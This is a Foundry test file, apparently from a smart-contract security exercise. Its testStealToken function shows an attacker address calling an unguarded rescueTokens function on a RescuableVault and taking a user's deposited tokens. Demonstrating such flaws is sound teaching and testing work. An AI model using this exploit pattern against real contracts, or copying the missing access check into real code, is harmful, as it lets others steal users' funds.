// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {RescuableVault} from "../../src/access-control/RescuableVault.sol";
import {Test, console} from "forge-std/Test.sol";
import {MockToken} from "../test-contracts/MockToken.sol";

contract AccessControlTest is Test {
    RescuableVault public rescuableVault;
    MockToken public mockToken;
    address public ATTACKER = makeAddr("attacker");
    address public USER = makeAddr("user");
    uint256 public STARTING_BALANCE = 100000;
    uint256 public DECIMALS = 10 ** 18;

    function setUp() external {
        mockToken = new MockToken();
        rescuableVault = new RescuableVault(mockToken);
        fund(USER);
    }

    function testStealToken() external {
        vm.prank(USER);
        mockToken.transfer(address(rescuableVault), 1000 * DECIMALS);
        vm.prank(ATTACKER);
        rescuableVault.rescueTokens(ATTACKER);
        assertEq(1000 * DECIMALS, mockToken.balanceOf(ATTACKER));
    }
    function fund(address _address) internal {
        mockToken.mint(_address, STARTING_BALANCE * DECIMALS); //mint mock money for _address
        vm.startPrank(_address);
        mockToken.approve(address(rescuableVault), type(uint256).max); //we have to use approve in this section if we use in BaseVault we approve to user can use token which in BaseVault
        vm.stopPrank();
    }
}
